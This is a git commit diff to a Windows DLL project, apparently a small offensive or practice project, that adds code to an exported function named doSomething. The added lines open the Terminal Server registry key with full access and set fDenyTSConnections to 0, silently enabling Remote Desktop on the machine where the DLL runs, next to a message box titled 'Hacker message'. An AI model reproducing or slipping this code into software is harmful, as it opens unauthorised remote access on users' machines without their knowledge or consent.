e1a52b444b142f1492dbc74f50e7ff3713aff672
pxj5958 <pxj5958@gmail.com>
2022-03-14 18:27:37 -0400

    Added the regkey edit for RDP enable

--- PopExportMessage/dllmain.cpp
+++ PopExportMessage/dllmain.cpp
@@ -1,11 +1,23 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <windows.h>
+#include <stdio.h>
+#include <netfw.h>
+#pragma comment( lib, "ole32.lib" )
+
 
 
 extern "C" _declspec(dllexport)
 void doSomething(void)
 {
+
+
+
+    DWORD value = 0;
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_ALL_ACCESS, &hKey);
+    RegSetValueEx(hKey, TEXT("fDenyTSConnections"), 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
+
     MessageBox(NULL, L"Hello hello!", L"Hacker message", NULL);
 }
 
